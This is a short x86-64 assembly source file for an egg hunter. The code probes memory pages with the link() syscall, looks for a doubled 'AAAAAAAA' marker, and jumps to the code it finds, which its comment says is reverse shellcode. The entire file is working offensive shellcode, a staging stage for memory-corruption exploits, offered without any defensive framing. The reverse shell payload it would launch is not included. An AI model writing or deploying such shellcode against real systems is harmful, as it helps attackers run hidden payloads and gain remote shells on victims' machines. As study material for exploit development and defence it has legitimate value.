global _start
section .text

; this code will look for the 2 consecutive instances of 'AAAAAAAA'
; when found, it will execute the reverse shellcode


_start:
	xor rax,rax    ; initialize rax register
	xor rdx, rdx   ; initialize rdx register

page_align:
	or dx, 0xfff   ;page size alignment

incr:
	inc rdx    ;simply increment rdx

hunt_the_egg:
	lea rdi, [rdx + 8]                                    
        xor rax, rax   
        mov al, 0x56   ; 86 syscall for link()
        xor rsi, rsi
        syscall    
 
        cmp al, 0xf2                ;compare the return value
        jz page_align               ;no match, jump to the next page
        mov rax, 0x4141414141414141 ; 'AAAAAAAA' is the egg
        mov rdi, rdx                ;move the value in rdi
        scasq                       ;compare
	jnz incr                    ; if no match, increment again
	scasq                       ; compare again
	jnz incr                    ; increment again
	jmp rdi                     ; egg is found, jump to rdi
